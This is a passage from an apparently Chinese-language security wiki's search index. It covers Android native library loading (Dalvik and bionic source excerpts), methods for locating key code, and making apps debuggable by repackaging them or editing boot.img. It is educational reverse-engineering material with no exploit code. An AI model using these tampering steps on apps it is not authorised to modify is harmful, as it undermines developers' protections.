( pEntry -> classLoader != classLoader ) { ALOGW ( \"Shared lib '%s' already opened by CL %p; can't open in %p\" , pathName , pEntry -> classLoader , classLoader ); return false ; } if ( verbose ) { ALOGD ( \"Shared lib '%s' already loaded in same CL %p\" , pathName , classLoader ); } if ( ! checkOnLoadResult ( pEntry )) return false ; return true ; } \u5982\u679c\u6ca1\u6709\u52a0\u8f7d\u7684\u8bdd\uff0c\u5c31\u4f1a\u5229\u7528 dlopen \u6253\u5f00\u8be5\u5171\u4eab\u5e93\u3002 /* * Open the shared library. Because we're using a full path, the system * doesn't have to search through LD_LIBRARY_PATH. (It may do so to * resolve this library's dependencies though.) * * Failures here are expected when java.library.path has several entries * and we have to hunt for the lib. * * The current version of the dynamic linker prints detailed information * about dlopen() failures. Some things to check if the message is * cryptic: * - make sure the library exists on the device * - verify that the right path is being opened (the debug log message * above can help with that) * - check to see if the library is valid (e.g. not zero bytes long) * - check config/prelink-linux-arm.map to ensure that the library * is listed and is not being overrun by the previous entry (if * loading suddenly stops working on a prelinked library, this is * a good one to check) * - write a trivial app that calls sleep() then dlopen(), attach * to it with \"strace -p <pid>\" while it sleeps, and watch for * attempts to open nonexistent dependent shared libs * * This can execute slowly for a large library on a busy system, so we * want to switch from RUNNING to VMWAIT while it executes. This allows * the GC to ignore us. */ Thread * self = dvmThreadSelf (); ThreadStatus oldStatus = dvmChangeStatus ( self , THREAD_VMWAIT ); handle = dlopen ( pathName , RTLD_LAZY ); dvmChangeStatus ( self , oldStatus ); if ( handle == NULL ) { * detail = strdup ( dlerror ()); ALOGE ( \"dlopen( \\\" %s \\\" ) failed: %s\" , pathName , * detail ); return false ; } \u5176\u4e2d\u7684 dlopen \u51fd\u6570( bionic/linker/dlfcn.cpp )\u5982\u4e0b void * dlopen ( const char * filename , int flags ) { ScopedPthreadMutexLocker locker ( & gDlMutex ); soinfo * result = do_dlopen ( filename , flags ); if ( result == NULL ) { __bionic_format_dlerror ( \"dlopen failed\" , linker_get_error_buffer ()); return NULL ; } return result ; } \u5176\u4f1a\u8c03\u7528 do_dlopen \u51fd\u6570( bionic/linker/linker.cpp )\uff0c\u5982\u4e0b soinfo * do_dlopen ( const char * name , int flags ) { if (( flags & ~ ( RTLD_NOW | RTLD_LAZY | RTLD_LOCAL | RTLD_GLOBAL )) != 0 ) { DL_ERR ( \"invalid flags to dlopen: %x\" , flags ); return NULL ; } set_soinfo_pool_protection ( PROT_READ | PROT_WRITE ); soinfo * si = find_library ( name ); //\u5224\u65ad\u662f\u5426\u6709\u8fd9\u4e2a\u5e93\uff0c\u6709\u7684\u8bdd\uff0c\u9700\u8981\u5b8c\u6210\u521d\u59cb\u5316\u5de5\u4f5c if ( si != NULL ) { si -> CallConstructors (); } set_soinfo_pool_protection ( PROT_READ ); return si ; } \u5728\u627e\u5230\u5bf9\u5e94\u7684\u5e93\u4e4b\u540e\uff0c\u4f1a\u4f7f\u7528 si->CallConstructors(); \u6765\u6784\u9020\u76f8\u5173\u4fe1\u606f\uff0c\u5982\u4e0b void soinfo :: CallConstructors () { if ( constructors_called ) { return ; } // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true ; if (( flags & FLAG_EXE ) == 0 && preinit_array != NULL ) { // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT ( \" \\\" %s \\\" : ignoring %d-entry DT_PREINIT_ARRAY in shared library!\" , name , preinit_array_count ); } if ( dynamic != NULL ) { for ( Elf32_Dyn * d = dynamic ; d -> d_tag != DT_NULL ; ++ d ) { if ( d -> d_tag == DT_NEEDED ) { const char * library_name = strtab + d -> d_un . d_val ; TRACE ( \" \\\" %s \\\" : calling constructors in DT_NEEDED \\\" %s \\\" \" , name , library_name ); find_loaded_library ( library_name ) -> CallConstructors (); //\u5224\u65ad\u5e93\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d } } } TRACE ( \" \\\" %s \\\" : calling constructors\" , name ); // DT_INIT should be called before DT_INIT_ARRAY if both are present. CallFunction ( \"DT_INIT\" , init_func ); CallArray ( \"DT_INIT_ARRAY\" , init_array , init_array_count , false ); } \u53ef\u4ee5\u770b\u51fa\uff0c\u6b63\u5982\u6ce8\u91ca\u6240\u5199\u7684\uff0c\u5982\u8bf4 .init \u51fd\u6570\u4e0e init_array \u5b58\u5728\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u4f9d\u6b21\u8c03\u7528 .init \u51fd\u6570\u4e0e.init_array \u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u7684\u4ee3\u7801\u3002\u76f8\u5173\u8bf4\u660e\u5982\u4e0b #define DT_INIT 12 /* Address of initialization function */ #define DT_INIT_ARRAY 25 /* Address of initialization function array */ \u5efa\u7acb\u4e00\u4e2a\u6253\u5f00\u7684\u5171\u4eab\u5e93\u7684 entry\uff0c\u5e76\u8bd5\u56fe\u5176\u52a0\u5165\u5230\u5bf9\u5e94\u7684 list \u4e2d\uff0c\u65b9\u4fbf\u7ba1\u7406\u3002\u5982\u679c\u52a0\u5165\u5931\u8d25\u7684\u8bdd\uff0c\u5c31\u4f1a\u5bf9\u5176\u8fdb\u884c\u91ca\u653e\u3002 /* create a new entry */ SharedLib * pNewEntry ; pNewEntry = ( SharedLib * ) calloc ( 1 , sizeof ( SharedLib )); pNewEntry -> pathName = strdup ( pathName ); pNewEntry -> handle = handle ; pNewEntry -> classLoader = classLoader ; dvmInitMutex ( & pNewEntry -> onLoadLock ); pthread_cond_init ( & pNewEntry -> onLoadCond , NULL ); pNewEntry -> onLoadThreadId = self -> threadId ; /* try to add it to the list */ SharedLib * pActualEntry = addSharedLibEntry ( pNewEntry ); if ( pNewEntry != pActualEntry ) { ALOGI ( \"WOW: we lost a race to add a shared lib (%s CL=%p)\" , pathName , classLoader ); freeSharedLibEntry ( pNewEntry ); return checkOnLoadResult ( pActualEntry ); } \u5982\u679c\u52a0\u8f7d\u6210\u529f\uff0c\u5c31\u4f1a\u5229\u7528 dlsym \u6765\u83b7\u53d6\u5bf9\u5e94 so \u6587\u4ef6\u4e2d\u7684 JNI_OnLoad \u51fd\u6570\uff0c\u5982\u679c\u5b58\u5728\u8be5\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u8fdb\u884c\u8c03\u7528\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u3002 else { if ( verbose ) ALOGD ( \"Added shared lib %s %p\" , pathName , classLoader ); bool result = false ; void * vonLoad ; int version ; vonLoad = dlsym ( handle , \"JNI_OnLoad\" ); if ( vonLoad == NULL ) { ALOGD ( \"No JNI_OnLoad found in %s %p, skipping init\" , pathName , classLoader ); result = true ; } else { /* * Call JNI_OnLoad. We have to override the current class * loader, which will always be \"null\" since the stuff at the * top of the stack is around Runtime.loadLibrary(). (See * the comments in the JNI FindClass function.) */ OnLoadFunc func = ( OnLoadFunc ) vonLoad ; Object * prevOverride = self -> classLoaderOverride ; self -> classLoaderOverride = classLoader ; oldStatus = dvmChangeStatus ( self , THREAD_NATIVE ); if ( gDvm . verboseJni ) { ALOGI ( \"[Calling JNI_OnLoad for \\\" %s \\\" ]\" , pathName ); } version = ( * func )( gDvmJni . jniVm , NULL ); dvmChangeStatus ( self , oldStatus ); self -> classLoaderOverride = prevOverride ; if ( version == JNI_ERR ) { * detail = strdup ( StringPrintf ( \"JNI_ERR returned from JNI_OnLoad in \\\" %s \\\" \" , pathName ). c_str ()); } else if ( dvmIsBadJniVersion ( version )) { * detail = strdup ( StringPrintf ( \"Bad JNI version returned from JNI_OnLoad in \\\" %s \\\" : %d\" , pathName , version ). c_str ()); /* * It's unwise to call dlclose() here, but we can mark it * as bad and ensure that future load attempts will fail. * * We don't know how far JNI_OnLoad got, so there could * be some partially-initialized stuff accessible through * newly-registered native method calls. We could try to * unregister them, but that doesn't seem worthwhile. */ } else { result = true ; } if ( gDvm . verboseJni ) { ALOGI ( \"[Returned %s from JNI_OnLoad for \\\" %s \\\" ]\" , ( result ? \"successfully\" : \"failure\" ), pathName ); } } if ( result ) pNewEntry -> onLoadResult = kOnLoadOkay ; else pNewEntry -> onLoadResult = kOnLoadFailed ; pNewEntry -> onLoadThreadId = 0 ; /* * Broadcast a wakeup to anybody sleeping on the condition variable. */ dvmLockMutex ( & pNewEntry -> onLoadLock ); pthread_cond_broadcast ( & pNewEntry -> onLoadCond ); dvmUnlockMutex ( & pNewEntry -> onLoadLock ); return result ; } }","title":"dvmLoadNativeCode"},{"location":"android/basic_operating_mechanism/native_layer/so/#_4","text":"\u8fd9\u8bf4\u660e\u52a0\u8f7d .so \u6587\u4ef6\u65f6\uff0c\u4f1a\u6309\u7167\u6267\u884c\u5982\u4e0b\u987a\u5e8f\u7684\u51fd\u6570\uff08\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u8df3\u8fc7\uff09 .init \u51fd\u6570 .init_array \u4e2d\u7684\u51fd\u6570 JNI_OnLoad \u51fd\u6570","title":"\u603b\u7ed3"},{"location":"android/basic_reverse/android_code_location/","text":"Android \u5173\u952e\u4ee3\u7801\u5b9a\u4f4d \u00b6 AndroidManifest.xml\u6587\u4ef6 \u8f6f\u4ef6\u5305\u540d apk\u4e3b\u6d3b\u52a8\uff0c\u9690\u85cf\u7a0b\u5e8f\u6ca1\u6709\u4e3bActivity Application\u5728 java\u5c42\u542f\u52a8\u6700\u65e9\uff0c \u987a\u5e8f\u5206\u6790 \u00b6 \u6700\u5e38\u89c1\u4e5f\u662f\u6700\u6709\u7528\u7684\u65b9\u6cd5\u5c31\u662f\uff0c\u6211\u4eec\u987a\u7740\u7a0b\u5e8f\u7684\u903b\u8f91\u4f9d\u6b21\u67e5\u770b\u7a0b\u5e8f\u7684\u4ee3\u7801\u6765\u8fdb\u884c\u5206\u6790\uff0c\u4f46\u662f\u5f53\u7a0b\u5e8f\u4ee3\u7801\u91cf\u7279\u522b\u5927\u65f6\u5019\uff0c\u8fd9\u4e00\u65b9\u6cd5\u7684\u6548\u7387\u5c31\u6bd4\u8f83\u4f4e\u4e0b\uff0c\u9700\u8981\u5176\u4ed6\u65b9\u6cd5\u6765\u8f85\u52a9\u3002 \u5b57\u7b26\u4e32\u5b9a\u4f4d\u6cd5 \u00b6 \u6240\u8c13\u5b57\u7b26\u4e32\u5b9a\u4f4d\u6cd5\u5c31\u662f\u901a\u8fc7\u5728\u7a0b\u5e8f\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u76f8\u5e94\u7684\u51fd\u6570\u3002\u5b57\u7b26\u4e32\u6709\u53ef\u80fd\u88ab\u76f4\u63a5\u786c\u7f16\u7801\u5728\u7a0b\u5e8f\u4e2d\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u5b57\u7b26\u4e32id\u6765\u7d22\u5f15\u3002\u8fd9\u4e00\u65b9\u6cd5\u6545\u53bb\u4f7f\u7528\u6bd4\u8f83\u65b9\u4fbf\uff0c\u4f46\u73b0\u5728\u7684\u8bdd\uff0c\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u4f1a\u88ab\u5206\u5f00\u6216\u8005\u8bf4\u9996\u5148\u88ab\u52a0\u5bc6\uff0c\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u88ab\u52a8\u6001\u89e3\u5bc6\u3002 \u6211\u4eec\u53ef\u80fd\u5173\u6ce8\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u6709 \u7a0b\u5e8f\u62a5\u9519\u4fe1\u606f \u670d\u52a1 \u5e7f\u64ad \u654f\u611fAPI\u5b9a\u4f4d \u00b6 \u6240\u8c13\u654f\u611fAPI\u5b9a\u4f4d\u6cd5\uff0c\u610f\u601d\u5c31\u662f\u6211\u4eec\u6839\u636e\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u6765\u5224\u65ad\u7a0b\u5e8f\u53ef\u80fd\u8c03\u7528\u4e86\u54ea\u4e9b\u51fd\u6570\u3002\u8fd9\u4e00\u65b9\u6cd5\u9700\u8981\u6211\u4eec\u5bf9\u4e8eAndroid\u4e2d\u7684API\u6bd4\u8f83\u719f\u6089\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5173\u6ce8\u4ee5\u4e0b\u65b9\u9762 \u63a7\u4ef6\u7684\u4e8b\u4ef6\u51fd\u6570 onclick show Toast \u7f51\u7edc\u51fd\u6570 HttpGet HttpPost HttpUriRequest socket \u53d1\u9001\u77ed\u4fe1 \u6253\u7535\u8bdd \u5b9a\u4f4d \u7b49\u7b49 log\u4fe1\u606f \u00b6 \u6240\u8c13log\u4fe1\u606f\u5c31\u662fAndroid\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u4e0d\u4f1a\u5728\u6211\u4eec\u7684\u754c\u9762\u4e0a\u4f53\u73b0\uff0c\u56e0\u800c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5176\u5b83\u8f85\u52a9\u5de5\u5177\u6765\u5206\u6790\uff0c\u6bd4\u5982\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ddms\u6765\u8f85\u52a9\u5206\u6790\u3002\u5bf9\u4e8elog\u4fe1\u606f\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u4e2a\u65b9\u9762\u8003\u8651 \u5229\u7528\u7a0b\u5e8f\u672c\u8eab\u4ea7\u751f\u7684log\u4fe1\u606f \u81ea\u5df1\u5bf9\u4ee3\u7801\u53cd\u7f16\u8bd1\uff0c\u63d2\u5165log\u4fe1\u606f\uff0c\u5e76\u91cd\u6253\u5305\u6765\u8fdb\u884c\u5206\u6790\u3002 \u6808\u8ddf\u8e2a \u00b6 \u6211\u4eec\u53ef\u4ee5\u7528ddms\u63d0\u4f9b\u7684\u65b9\u6cd5\u8c03\u7528\u94fe\u7684\u4fe1\u606f\u6765\u5224\u65ad\u7a0b\u5e8f\u76ee\u524d\u7684\u8c03\u7528\u5173\u7cfb\u5982\u4f55\u3002 \u94a9\u5b50 \u00b6 xposed cydia monitor \u00b6 \u8fd0\u884clog\uff0c\u7a0b\u5e8f\u8fd0\u884c\u4ea7\u751f\u7684\uff0c\u7cfb\u7edf\u8fd0\u884c\u4ea7\u751f\u7684 \u7ebf\u7a0b\u8ddf\u8e2a \u65b9\u6cd5\u8c03\u7528\u94fe \u52a8\u6001\u8c03\u8bd5 \u00b6","title":"Android \u5173\u952e\u4ee3\u7801\u5b9a\u4f4d"},{"location":"android/basic_reverse/android_code_location/#android","text":"AndroidManifest.xml\u6587\u4ef6 \u8f6f\u4ef6\u5305\u540d apk\u4e3b\u6d3b\u52a8\uff0c\u9690\u85cf\u7a0b\u5e8f\u6ca1\u6709\u4e3bActivity Application\u5728 java\u5c42\u542f\u52a8\u6700\u65e9\uff0c","title":"Android \u5173\u952e\u4ee3\u7801\u5b9a\u4f4d"},{"location":"android/basic_reverse/android_code_location/#_1","text":"\u6700\u5e38\u89c1\u4e5f\u662f\u6700\u6709\u7528\u7684\u65b9\u6cd5\u5c31\u662f\uff0c\u6211\u4eec\u987a\u7740\u7a0b\u5e8f\u7684\u903b\u8f91\u4f9d\u6b21\u67e5\u770b\u7a0b\u5e8f\u7684\u4ee3\u7801\u6765\u8fdb\u884c\u5206\u6790\uff0c\u4f46\u662f\u5f53\u7a0b\u5e8f\u4ee3\u7801\u91cf\u7279\u522b\u5927\u65f6\u5019\uff0c\u8fd9\u4e00\u65b9\u6cd5\u7684\u6548\u7387\u5c31\u6bd4\u8f83\u4f4e\u4e0b\uff0c\u9700\u8981\u5176\u4ed6\u65b9\u6cd5\u6765\u8f85\u52a9\u3002","title":"\u987a\u5e8f\u5206\u6790"},{"location":"android/basic_reverse/android_code_location/#_2","text":"\u6240\u8c13\u5b57\u7b26\u4e32\u5b9a\u4f4d\u6cd5\u5c31\u662f\u901a\u8fc7\u5728\u7a0b\u5e8f\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u76f8\u5e94\u7684\u51fd\u6570\u3002\u5b57\u7b26\u4e32\u6709\u53ef\u80fd\u88ab\u76f4\u63a5\u786c\u7f16\u7801\u5728\u7a0b\u5e8f\u4e2d\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u5b57\u7b26\u4e32id\u6765\u7d22\u5f15\u3002\u8fd9\u4e00\u65b9\u6cd5\u6545\u53bb\u4f7f\u7528\u6bd4\u8f83\u65b9\u4fbf\uff0c\u4f46\u73b0\u5728\u7684\u8bdd\uff0c\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u4f1a\u88ab\u5206\u5f00\u6216\u8005\u8bf4\u9996\u5148\u88ab\u52a0\u5bc6\uff0c\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u88ab\u52a8\u6001\u89e3\u5bc6\u3002 \u6211\u4eec\u53ef\u80fd\u5173\u6ce8\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u6709 \u7a0b\u5e8f\u62a5\u9519\u4fe1\u606f \u670d\u52a1 \u5e7f\u64ad","title":"\u5b57\u7b26\u4e32\u5b9a\u4f4d\u6cd5"},{"location":"android/basic_reverse/android_code_location/#api","text":"\u6240\u8c13\u654f\u611fAPI\u5b9a\u4f4d\u6cd5\uff0c\u610f\u601d\u5c31\u662f\u6211\u4eec\u6839\u636e\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u6765\u5224\u65ad\u7a0b\u5e8f\u53ef\u80fd\u8c03\u7528\u4e86\u54ea\u4e9b\u51fd\u6570\u3002\u8fd9\u4e00\u65b9\u6cd5\u9700\u8981\u6211\u4eec\u5bf9\u4e8eAndroid\u4e2d\u7684API\u6bd4\u8f83\u719f\u6089\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5173\u6ce8\u4ee5\u4e0b\u65b9\u9762 \u63a7\u4ef6\u7684\u4e8b\u4ef6\u51fd\u6570 onclick show Toast \u7f51\u7edc\u51fd\u6570 HttpGet HttpPost HttpUriRequest socket \u53d1\u9001\u77ed\u4fe1 \u6253\u7535\u8bdd \u5b9a\u4f4d \u7b49\u7b49","title":"\u654f\u611fAPI\u5b9a\u4f4d"},{"location":"android/basic_reverse/android_code_location/#log","text":"\u6240\u8c13log\u4fe1\u606f\u5c31\u662fAndroid\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u4e0d\u4f1a\u5728\u6211\u4eec\u7684\u754c\u9762\u4e0a\u4f53\u73b0\uff0c\u56e0\u800c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u5176\u5b83\u8f85\u52a9\u5de5\u5177\u6765\u5206\u6790\uff0c\u6bd4\u5982\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ddms\u6765\u8f85\u52a9\u5206\u6790\u3002\u5bf9\u4e8elog\u4fe1\u606f\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u4e2a\u65b9\u9762\u8003\u8651 \u5229\u7528\u7a0b\u5e8f\u672c\u8eab\u4ea7\u751f\u7684log\u4fe1\u606f \u81ea\u5df1\u5bf9\u4ee3\u7801\u53cd\u7f16\u8bd1\uff0c\u63d2\u5165log\u4fe1\u606f\uff0c\u5e76\u91cd\u6253\u5305\u6765\u8fdb\u884c\u5206\u6790\u3002","title":"log\u4fe1\u606f"},{"location":"android/basic_reverse/android_code_location/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u7528ddms\u63d0\u4f9b\u7684\u65b9\u6cd5\u8c03\u7528\u94fe\u7684\u4fe1\u606f\u6765\u5224\u65ad\u7a0b\u5e8f\u76ee\u524d\u7684\u8c03\u7528\u5173\u7cfb\u5982\u4f55\u3002","title":"\u6808\u8ddf\u8e2a"},{"location":"android/basic_reverse/android_code_location/#_4","text":"xposed cydia","title":"\u94a9\u5b50"},{"location":"android/basic_reverse/android_code_location/#monitor","text":"\u8fd0\u884clog\uff0c\u7a0b\u5e8f\u8fd0\u884c\u4ea7\u751f\u7684\uff0c\u7cfb\u7edf\u8fd0\u884c\u4ea7\u751f\u7684 \u7ebf\u7a0b\u8ddf\u8e2a \u65b9\u6cd5\u8c03\u7528\u94fe","title":"monitor"},{"location":"android/basic_reverse/android_code_location/#_5","text":"","title":"\u52a8\u6001\u8c03\u8bd5"},{"location":"android/basic_reverse/overview/","text":"Android \u9006\u5411\u57fa\u672c\u4ecb\u7ecd \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b Android \u9006\u5411\u7684\u76ee\u7684\uff1a \u5e0c\u671b\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u529f\u80fd \u3002\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u6709\u4e24\u4e2a\u65b9\u9762\uff08\u65b9\u6cd5\u4e0e\u5bf9\u8c61\uff09\u53ef\u4ee5\u8003\u8651 \u5206\u6790\u65b9\u6cd5\uff0c\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u65b9\u5f0f \u9759\u6001\u5206\u6790\uff0c\u5bf9\u6e90\u4ee3\u7801\u8fdb\u884c\u9006\u5411\uff0c\u7136\u540e\u9605\u8bfb\u5206\u6790 \u52a8\u6001\u5206\u6790\uff0c\u5bf9\u4ee3\u7801\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u822c\u6765\u8bf4\u52a8\u6001\u5206\u6790\u79bb\u4e0d\u5f00\u9759\u6001\u5206\u6790\u3002 \u5206\u6790\u5bf9\u8c61\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u7c7b\u5bf9\u8c61 java\uff0c\u5c42\u4ee3\u7801 \u539f\u751f\u5c42\u4ee3\u7801 \u4e0d\u96be\u770b\u51fa\uff0c\u8981\u60f3\u5206\u6790 Android \u5e94\u7528\uff0c\u57fa\u672c\u7684 java \u5c42\u7684\u77e5\u8bc6\u4e0e\u539f\u751f\u5c42\u7684\u77e5\u8bc6\u8fd8\u662f\u6709\u5fc5\u8981\u638c\u63e1\u7684\u3002 \u76ee\u524d\u6765\u8bf4\uff0cAndroid \u9006\u5411\u4e3b\u8981\u5e94\u7528\u4e8e\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u5411 app \u5b89\u5168\u5ba1\u67e5 \u7cfb\u7edf\u6f0f\u6d1e\u6316\u6398 \u6076\u610f\u4ee3\u7801\u6740\u67e5 \u540c\u884c\u4e1a\u4ea7\u54c1\u6280\u672f\u539f\u7406\u5206\u6790 \u79fb\u9664\u5b89\u5168\u673a\u5236","title":"\u7b80\u8ff0"},{"location":"android/basic_reverse/overview/#android","text":"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b Android \u9006\u5411\u7684\u76ee\u7684\uff1a \u5e0c\u671b\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u529f\u80fd \u3002\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u6709\u4e24\u4e2a\u65b9\u9762\uff08\u65b9\u6cd5\u4e0e\u5bf9\u8c61\uff09\u53ef\u4ee5\u8003\u8651 \u5206\u6790\u65b9\u6cd5\uff0c\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u65b9\u5f0f \u9759\u6001\u5206\u6790\uff0c\u5bf9\u6e90\u4ee3\u7801\u8fdb\u884c\u9006\u5411\uff0c\u7136\u540e\u9605\u8bfb\u5206\u6790 \u52a8\u6001\u5206\u6790\uff0c\u5bf9\u4ee3\u7801\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u822c\u6765\u8bf4\u52a8\u6001\u5206\u6790\u79bb\u4e0d\u5f00\u9759\u6001\u5206\u6790\u3002 \u5206\u6790\u5bf9\u8c61\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u7c7b\u5bf9\u8c61 java\uff0c\u5c42\u4ee3\u7801 \u539f\u751f\u5c42\u4ee3\u7801 \u4e0d\u96be\u770b\u51fa\uff0c\u8981\u60f3\u5206\u6790 Android \u5e94\u7528\uff0c\u57fa\u672c\u7684 java \u5c42\u7684\u77e5\u8bc6\u4e0e\u539f\u751f\u5c42\u7684\u77e5\u8bc6\u8fd8\u662f\u6709\u5fc5\u8981\u638c\u63e1\u7684\u3002 \u76ee\u524d\u6765\u8bf4\uff0cAndroid \u9006\u5411\u4e3b\u8981\u5e94\u7528\u4e8e\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u5411 app \u5b89\u5168\u5ba1\u67e5 \u7cfb\u7edf\u6f0f\u6d1e\u6316\u6398 \u6076\u610f\u4ee3\u7801\u6740\u67e5 \u540c\u884c\u4e1a\u4ea7\u54c1\u6280\u672f\u539f\u7406\u5206\u6790 \u79fb\u9664\u5b89\u5168\u673a\u5236","title":"Android \u9006\u5411\u57fa\u672c\u4ecb\u7ecd"},{"location":"android/basic_reverse/dynamic/dynamic_debug/","text":"Android \u52a8\u6001\u8c03\u8bd5 \u00b6 Android \u8c03\u8bd5\u57fa\u672c\u539f\u7406 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0cAndroid \u6839\u636e\u5982\u4e0b\u7684\u987a\u5e8f\u6765\u5224\u65ad\u4e00\u4e2a\u5e94\u7528\u662f\u5426\u53ef\u4ee5\u88ab\u8c03\u8bd5 \u68c0\u6d4b boot.img \u4e2d\u7684 ro.debuggable \u662f\u5426\u4e3a1\uff0c\u4e3a 1 \u7684\u8bdd\uff0c\u624b\u673a\u4e2d\u7684\u4efb\u4f55\u5e94\u7528\u5747\u53ef\u4ee5\u8c03\u8bd5\u3002 \u5426\u5219\uff0c\u68c0\u6d4b\u5bf9\u5e94\u5e94\u7528\u4e2d AndroidManifest.xml \u4e2d \\<application> \u5143\u7d20\u4e2d\u662f\u5426\u5305\u542b\u4e86android:debuggable=\"true\"\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u624d\u4f1a\u5f00\u542f\u8c03\u8bd5\u652f\u6301\u3002 \u81ea\u7136\uff0c\u6211\u4eec\u4e5f\u5c31\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u4f7f\u5f97\u4e00\u4e2a\u5e94\u7528\u53ef\u4ee5\u88ab\u8c03\u8bd5 \u5c06\u4e00\u4e2a apk \u6587\u4ef6\u89e3\u5305\uff0c\u5728 \\<application> \u5143\u7d20\u4e2d\u6dfb\u52a0 android:debuggable=\"true\"\uff0c\u7136\u540e\u91cd\u6253\u5305\uff0c\u7b7e\u540d\u3002 \u4fee\u6539 boot.img \u4e2d\u7684 ro.debuggable \u4e3a 1\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u56e0\u4e3a\u524d\u8005\u9700\u8981\u6211\u4eec\u6bcf\u6b21\u90fd\u9700\u8981\u4fee\u6539\u5e94\u7528\uff0c\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6211\u4eec\u66f4\u503e\u5411\u4e8e\u540e\u8005\uff0c\u3002 \u5bf9\u4e8e\u540e\u8005\u6765\u8bf4\uff0c\u6211\u4eec\u9700\u8981 root \u624b\u673a\uff0c\u5e76\u5237\u5165\u76f8\u5173\u7684\u955c\u50cf\u3002\uff08 \uff01\uff01\u627e\u4e00\u7bc7\u5408\u9002\u7684\u6587\u7ae0\uff01\uff01 \uff09 \u6b64\u5916\uff0c\u7531 Andoird AVD \u751f\u6210\u7684\u6a21\u62df\u5668\u9ed8\u8ba4\u60c5\u51b5\u4e0b ro.debuggable \u88ab\u8bbe\u7f6e\u4e3a1\u3002 ro.debuggable \u7684\u503c\u53ef\u4ee5\u6839\u636e\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u8be2 adb shell getprop ro.debuggable \u57fa\u672c\u8c03\u8bd5\u5de5\u5177 \u00b6 DDMS \u00b6 DDMS\uff08Dalvik Debug Monitor Service\uff09\u662fDalvik\u865a\u62df\u673a\u8c03\u8bd5\u76d1\u63a7\u670d\u52a1\uff0c\u53ef\u4ee5\u76d1\u89c6Android\u7a0b\u5e8f\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u72b6\u6001\u4ee5\u53ca\u7ed3\u679c\uff0c\u53ef\u4ee5\u5927\u5927\u52a0\u5feb\u6211\u4eec\u7684\u7a0b\u5e8f\u5206\u6790\u6548\u7387\u3002\u8fd9\u662f\u4e00\u6b3e\u7531Android SDK\u63d0\u4f9b\u7684\u5de5\u5177\uff0c\u5176\u4e2d\u6709\u8bbe\u5907\u622a\u5c4f\uff0c\u67e5\u770b\u8fd0\u884c\u7684\u7ebf\u7a0b\u4fe1\u606f\u3001\u6587\u4ef6\u6d4f\u89c8\u3001Logcat\u3001Method 